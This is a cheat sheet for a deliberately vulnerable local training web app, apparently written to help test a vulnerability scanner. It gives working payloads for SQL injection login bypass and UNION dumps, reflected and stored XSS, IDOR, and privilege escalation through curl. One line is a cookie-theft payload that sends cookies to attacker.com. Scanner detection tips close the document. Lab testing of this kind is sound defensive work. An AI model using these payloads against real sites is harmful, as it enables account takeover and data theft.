# VulnHub – Vulnerability Cheat Sheet

Running at: http://localhost:5001

## Credentials
| Username | Password       | Role  |
|----------|---------------|-------|
| admin    | Admin@Secret99 | admin |
| alice    | alice123       | user  |
| bob      | bob456         | user  |
| carol    | carol789       | user  |

---

## Vulnerability 1 — SQL Injection
**Endpoint:** `POST /login`
**Field:** `username`

### How it works
The login query is built with raw string formatting:
```sql
SELECT * FROM users WHERE username='{username}' AND password='{password}'
```

### Payloads

**Auth bypass (login as admin without password):**
```
username: admin'--
password: anything
```

**Login as any user:**
```
username: alice'--
password: anything
```

**Dump all users via UNION:**
```
username: ' UNION SELECT 1,username,password,email,role,bio,phone FROM users--
password: x
```

**Trigger a DB error (error-based detection):**
```
username: '
password: x
```

---

## Vulnerability 2 — Cross-Site Scripting (XSS)

### 2a. Reflected XSS
**Endpoint:** `GET /search?q=<payload>`

The `q` parameter is reflected directly into the HTML response without encoding.

**Payloads:**
```
/search?q=<script>alert('XSS')</script>
/search?q=<img src=x onerror=alert(document.cookie)>
/search?q=<svg onload=alert(1)>
```

**Cookie theft simulation:**
```
/search?q=<script>document.write('<img src="http://attacker.com/steal?c='+document.cookie+'">')</script>
```

### 2b. Stored XSS
**Endpoint:** `POST /board` (field: `body`)

Messages are stored in the DB and rendered without sanitisation.
Every user who loads `/board` executes the payload.

**Payloads (post via the form or a proxy):**
```html
<script>alert('Stored XSS')</script>
<img src=x onerror="alert(document.cookie)">
<img src=x onerror="fetch('/api/users').then(r=>r.json()).then(d=>alert(JSON.stringify(d)))">
```

---

## Vulnerability 3 — IDOR (Insecure Direct Object Reference)

### 3a. Profile IDOR
**Endpoint:** `GET /profile/<user_id>`

No ownership check. Any authenticated user can view any profile.

```
Login as alice  → http://localhost:5001/login
Visit admin bio → http://localhost:5001/profile/1
Visit bob data  → http://localhost:5001/profile/3
```

Private data exposed: email, phone, bio (contains fake SSN/salary/CC numbers).

### 3b. Order IDOR
**Endpoint:** `GET /orders/<order_id>`

No check that the order belongs to the current user.

```
Login as alice (her order is #2)
Visit /orders/1  → sees admin's secret token: ADMIN-TOKEN-XYZ987
Visit /orders/3  → sees bob's secret token:   BOB-RECEIPT-002
Visit /orders/4  → sees carol's secret token: CAROL-RECEIPT-003
```

---

## Vulnerability 4 — Privilege Escalation

**Endpoint:** `POST /update-profile`
**Hidden field:** `role`

The server accepts `role` from the POST body and writes it directly to the DB.
The edit form on the profile page does NOT show the role field — but you can
inject it via a proxy (Burp, OWASP ZAP) or with curl.

### Exploit with curl

1. Log in and grab your session cookie from the browser:
```bash
# Step 1 — login and save cookie
curl -c cookies.txt -d "username=alice&password=alice123" http://localhost:5001/login -L

# Step 2 — submit update-profile with role=admin injected
curl -b cookies.txt \
     -d "bio=hacked&email=alice@vulnhub.local&phone=555-0001&role=admin" \
     http://localhost:5001/update-profile -L

# Step 3 — verify — you should now see the Admin menu
curl -b cookies.txt http://localhost:5001/admin
```

### Exploit via proxy (Burp Suite / ZAP)
1. Login as `alice`
2. Open Profile → click **Save** on the edit form
3. Intercept the `POST /update-profile` request
4. Add `&role=admin` to the POST body
5. Forward → refresh the page → Admin link appears in nav

---

## Bonus — Unauthenticated API
**Endpoint:** `GET /api/users`

No authentication required. Returns all users with their roles.

```bash
curl http://localhost:5001/api/users
```

---

## Detection Tips for Your Scanner

| Vulnerability | Detection Signal |
|---|---|
| SQLi | HTTP 500 with SQL error text on `'` payload; response length change on `OR 1=1` |
| Reflected XSS | Injected `<script>` tag appears verbatim in response body |
| Stored XSS | Payload persists across page reloads on `/board` |
| IDOR | Accessing `/profile/1` as user id=2 returns 200 with different user data |
| Privilege Escalation | POST with `role=admin` → subsequent GET `/admin` returns 200 instead of 403 |
